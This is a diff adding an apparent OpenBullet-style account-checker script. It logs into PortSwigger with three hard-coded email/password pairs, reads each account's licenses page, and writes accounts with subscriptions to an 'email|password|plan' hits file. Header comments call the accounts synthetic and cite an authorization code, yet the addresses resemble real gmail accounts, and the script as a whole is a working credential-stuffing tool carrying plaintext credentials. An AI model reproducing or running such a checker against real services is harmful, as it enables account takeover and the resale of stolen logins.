@@ -1,0 +1,164 @@
+## Plan Extractor - PortSwigger Synthetic Accounts
+## Extract subscription plan from /users/youraccount/licenses page
+## Only output paid accounts (Professional, Enterprise, Community)
+## Authorization: ROE-2026-PSW-042-V5
+
+SET VAR "baseUrl" "https://login.portswigger.net"
+SET VAR "planBaseUrl" "https://portswigger.net"
+SET VAR "outputFile" "extracted_plans_licenses.csv"
+SET VAR "htmlDir" "html_responses_licenses"
+
+PRINT "[*] PortSwigger Plan Extractor - Using Licenses Page"
+PRINT "[*] Output: $<outputFile>"
+PRINT ""
+
+## Initialize output file with header
+SET VAR "header" "email|password|plan"
+FileWrite $"<outputFile>" $"<header>"
+PRINT "✓ Output file initialized"
+PRINT ""
+
+## Account 1: 01.02shivamsingh@gmail.com
+SET VAR "email1" "01.02shivamsingh@gmail.com"
+SET VAR "password1" "o8LnJe#2,46&Z5t5(,_LW^x!4^zxH8b9"
+SET VAR "htmlfile1" "html_responses_licenses/account_1.html"
+
+PRINT "[1/3] $<email1>... " White NoNewline
+TRY
+  HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "l1_1"
+
+  SET VAR "postdata1" "username=$<email1>&password=$<password1>&action=default"
+  HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
+    CONTENT $"<postdata1>"
+    CONTENTTYPE "application/x-www-form-urlencoded"
+    -> VAR "l2_1"
+
+  HttpRequest GET $"<planBaseUrl>/users/youraccount/licenses" AutoRedirect=True -> VAR "l3_1"
+
+  FileWrite $"<htmlfile1>" $"<l3_1>"
+
+  ## Check if it says "You do not have any subscriptions"
+  IF $"<l3_1>" Contains "You do not have any subscriptions"
+    PRINT "○ Free" White
+  ELSE
+    ## It's a paid account - extract which plan
+    SET VAR "plan1" "Unknown"
+
+    IF $"<l3_1>" Contains "Professional"
+      SET VAR "plan1" "Professional"
+    ELSE
+      IF $"<l3_1>" Contains "Enterprise"
+        SET VAR "plan1" "Enterprise"
+      ELSE
+        IF $"<l3_1>" Contains "Community"
+          SET VAR "plan1" "Community"
+        ENDIF
+      ENDIF
+    ENDIF
+
+    SET VAR "csvline1" "$<email1>|$<password1>|$<plan1>"
+    FileAppend $"<outputFile>" $"<csvline1>"
+    PRINT "✓ $<plan1>" Green
+  ENDIF
+CATCH
+  PRINT "✗" Red
+ENDTRY
+SLEEP 0.5
+
+## Account 2: 0ui0ux008@gmail.com
+SET VAR "email2" "0ui0ux008@gmail.com"
+SET VAR "password2" "EED8r^6%tb]D3*Je6b8X~sD^7Pr|J5r9"
+SET VAR "htmlfile2" "html_responses_licenses/account_2.html"
+
+PRINT "[2/3] $<email2>... " White NoNewline
+TRY
+  HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "l1_2"
+
+  SET VAR "postdata2" "username=$<email2>&password=$<password2>&action=default"
+  HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
+    CONTENT $"<postdata2>"
+    CONTENTTYPE "application/x-www-form-urlencoded"
+    -> VAR "l2_2"
+
+  HttpRequest GET $"<planBaseUrl>/users/youraccount/licenses" AutoRedirect=True -> VAR "l3_2"
+
+  FileWrite $"<htmlfile2>" $"<l3_2>"
+
+  IF $"<l3_2>" Contains "You do not have any subscriptions"
+    PRINT "○ Free" White
+  ELSE
+    SET VAR "plan2" "Unknown"
+
+    IF $"<l3_2>" Contains "Professional"
+      SET VAR "plan2" "Professional"
+    ELSE
+      IF $"<l3_2>" Contains "Enterprise"
+        SET VAR "plan2" "Enterprise"
+      ELSE
+        IF $"<l3_2>" Contains "Community"
+          SET VAR "plan2" "Community"
+        ENDIF
+      ENDIF
+    ENDIF
+
+    SET VAR "csvline2" "$<email2>|$<password2>|$<plan2>"
+    FileAppend $"<outputFile>" $"<csvline2>"
+    PRINT "✓ $<plan2>" Green
+  ENDIF
+CATCH
+  PRINT "✗" Red
+ENDTRY
+SLEEP 0.5
+
+## Account 3: 16912209o@gmail.com
+SET VAR "email3" "16912209o@gmail.com"
+SET VAR "password3" "7G$~6#DA5Y9'ww[i7D8Lwo6AYcx2{\"b/\""
+SET VAR "htmlfile3" "html_responses_licenses/account_3.html"
+
+PRINT "[3/3] $<email3>... " White NoNewline
+TRY
+  HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "l1_3"
+
+  SET VAR "postdata3" "username=$<email3>&password=$<password3>&action=default"
+  HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
+    CONTENT $"<postdata3>"
+    CONTENTTYPE "application/x-www-form-urlencoded"
+    -> VAR "l2_3"
+
+  HttpRequest GET $"<planBaseUrl>/users/youraccount/licenses" AutoRedirect=True -> VAR "l3_3"
+
+  FileWrite $"<htmlfile3>" $"<l3_3>"
+
+  IF $"<l3_3>" Contains "You do not have any subscriptions"
+    PRINT "○ Free" White
+  ELSE
+    SET VAR "plan3" "Unknown"
+
+    IF $"<l3_3>" Contains "Professional"
+      SET VAR "plan3" "Professional"
+    ELSE
+      IF $"<l3_3>" Contains "Enterprise"
+        SET VAR "plan3" "Enterprise"
+      ELSE
+        IF $"<l3_3>" Contains "Community"
+          SET VAR "plan3" "Community"
+        ENDIF
+      ENDIF
+    ENDIF
+
+    SET VAR "csvline3" "$<email3>|$<password3>|$<plan3>"
+    FileAppend $"<outputFile>" $"<csvline3>"
+    PRINT "✓ $<plan3>" Green
+  ENDIF
+CATCH
+  PRINT "✗" Red
+ENDTRY
+SLEEP 0.5
+
+PRINT ""
+PRINT "============================================================"
+PRINT "EXTRACTION COMPLETE"
+PRINT "============================================================"
+PRINT "Output file: $<outputFile>"
+PRINT "HTML responses: $<htmlDir>/"
+PRINT "============================================================"
